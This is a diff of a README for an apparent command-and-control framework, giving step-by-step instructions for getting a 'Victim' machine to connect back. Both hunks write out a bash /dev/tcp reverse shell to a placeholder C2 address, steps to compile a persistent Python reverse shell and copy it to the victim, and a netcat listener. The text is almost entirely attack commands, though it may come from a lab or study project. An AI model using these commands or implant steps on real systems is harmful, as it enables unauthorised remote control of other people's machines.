@@ -24,12 +24,15 @@ Build and understand C2 infrastructure.
   - `firefox 127.0.0.1:5000`
 3. Have Victim connect to C2
   - Linux / MacOS
-    - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
     - This will drop the moment the C2 server 'drops'
-
-OR
+    - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
+  - Python reverse shell
     - This will continue to connect to the C2 server even after it 'drops'
-    - `./stardestroyer.py &`
+    - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
+    - `bash compiler.sh stardestroyer.py`
+    - Copy `stardestoryer` to VICTIM
+    - `chmod +x stardestroyer`
+    - `./stardestroyer`
 4. Start your listener 
   - `nc -nvlp 4444`
 5. Forward the connection to your listener
@@ -43,12 +46,15 @@ OR
   - `python3 deathstar-term.py`
 2. Have Victim connect to C2
   - Linux / MacOS
-    - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
     - This will drop the moment the C2 server 'drops'
-
-OR
+    - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
+  - Python reverse shell
     - This will continue to connect to the C2 server even after it 'drops'
-    - `./stardestroyer.py &`
+    - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
+    - `bash compiler.sh stardestroyer.py`
+    - Copy `stardestoryer` to VICTIM
+    - `chmod +x stardestroyer`
+    - `./stardestroyer`
 3. Start your listener 
   - `nc -nvlp 4444`
 4. Forward the connection to your listener
